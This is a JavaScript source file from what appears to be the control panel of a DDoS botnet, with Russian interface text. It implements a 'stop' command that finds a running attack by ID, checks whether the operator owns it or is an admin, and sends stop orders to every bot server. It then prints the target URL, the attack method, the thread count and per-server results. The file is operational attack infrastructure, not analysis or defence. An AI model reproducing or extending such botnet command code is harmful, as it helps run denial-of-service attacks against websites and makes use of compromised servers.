const CommandsCore = require('../../core')
const CommonData = require('../../../../common/data')
const center = require('../../../../utils/center')
const Botnet = require('../../../../botnet/core')
const { clearWithLogo } = require('../../../../utils/logo')
const config = require('../../../../../config')

CommandsCore.cmdInit(/^stop ([0-9]+)$/i, async (client, command, args) => {
    const attack = CommonData.attacks.find(x => x.id === Number(args[1]) && (x.network === client.user.network || client.user.network === config.GlobalNetworkName))
    if(!attack) {
        return client.write(center('Атака не найдена.'.red.italic, client.getWidth()) + '\n\n')
    }
    if(attack.sender !== client.username && !client.user.admin) {
        return client.write(center('Это не ваша атака.'.red.italic, client.getWidth()) + '\n\n')
    }

    CommonData.attacks.splice(CommonData.attacks.indexOf(attack), 1);

    let success = 0;
    let errors = 0;
    let internalErrors = 0;

    for(const server of CommonData.servers[attack.network]) {
        const serverNum = Number(CommonData.servers[attack.network].indexOf(server))
        let status = "OK".brightGreen
        const res = await Botnet.stop(attack.id, server);
        if(!res) {
            status = "ERROR".brightRed
            errors++;
        } else if(!res.success) {
            status = "INTERNAL ERROR".brightRed
            internalErrors++;
        } else success++;
        client.write(`Сервер №${serverNum + 1} `.brightWhite.bold + '.'.gray.repeat(client.getWidth() / 2 - serverNum.toString().length) + " " + status + '\n')
    }

    client.write(clearWithLogo(client))
    client.write('\t  Атака остановлена!  '.bgRed.brightWhite.bold + '\n\n'
    + '\tUser: '.brightBlue + attack.user.toString().brightWhite + '\n'
    + '\tURL: '.brightBlue + attack.url.brightWhite + '\n'
    + '\tMethod: '.brightBlue + attack.method.brightWhite + '\n'
    + '\tThreads: '.brightBlue + attack.threads.toString().brightWhite + '\n\n'
    + '\tSuccess: '.white + success.toString().green + '\n'
    + '\tErrors: '.white + errors.toString().red + '\n'
    + '\tInternalErrors: '.white + internalErrors.toString().red + '\n\n')
})